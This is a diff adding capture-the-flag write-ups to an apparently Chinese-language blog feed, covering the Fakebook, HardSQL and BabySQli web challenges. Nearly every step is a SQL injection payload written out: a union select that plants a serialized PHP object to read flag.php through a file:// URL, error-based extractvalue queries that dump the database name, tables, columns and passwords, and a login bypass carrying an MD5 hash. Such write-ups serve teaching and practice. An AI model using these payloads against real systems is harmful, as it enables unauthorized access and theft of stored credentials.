@@ -424,7 +424,36 @@
             </figure>
 
 <p>提交：ffifdyop<br>然后一个 MD5 弱类型、一个 MD5 强碰撞</p>
-<h1 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h1>]]></content>
+<h1 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h1><p>通过个人界面的 sql 注入查询得到的数据可以看到是经过序列化后的</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1600066589109-78520007-e35a-44ce-9f7e-16cd2028e7e8.png#align=left&display=inline&height=341&margin=%5Bobject%20Object%5D&name=image.png&originHeight=612&originWidth=1214&size=106377&status=done&style=stroke&width=677" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>下面有个 the contents of his/her blog，因为在</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1600066859906-6432a015-8c1d-438f-9f3d-8a98fceb8901.png#align=left&display=inline&height=140&margin=%5Bobject%20Object%5D&name=image.png&originHeight=280&originWidth=1445&size=51221&status=done&style=stroke&width=722.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p><code>-1 union/**/select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;}&#39; from users--+</code><br>在源代码中得到 base64，解码得到 flag</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1600067327093-48e5311e-0218-4078-9a16-bd150d040658.png#align=left&display=inline&height=540&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1079&originWidth=1920&size=195495&status=done&style=stroke&width=960" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<h1 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h1><p>爆库：geek<br><code>1&#39;^extractvalue(1,concat(0x7e,(select(database()))))%23</code><br>爆表：H4rDsq1<br><code>1&#39;^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#39;geek&#39;))))%23</code><br>爆字段：id,username,password<br><code>1&#39;^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;))))%23</code><br>爆数据<br><code>1&#39;^extractvalue(1,concat(0x7e,(select(left(password,30))from(geek.H4rDsq1))))%23</code><br><code>1&#39;^extractvalue(1,concat(0x7e,(select(right(password,30))from(geek.H4rDsq1))))%23</code></p>
+<h1 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h1><p>在注释中有提示：<code>select * from user where username = &#39;$name&#39;</code><br>username：1’ union select 1,’admin’,’202cb962ac59075b964b07152d234b70’#<br>password：123</p>
+]]></content>
   </entry>
   <entry>
     <title>PWN入门（格式化字符串漏洞）</title>
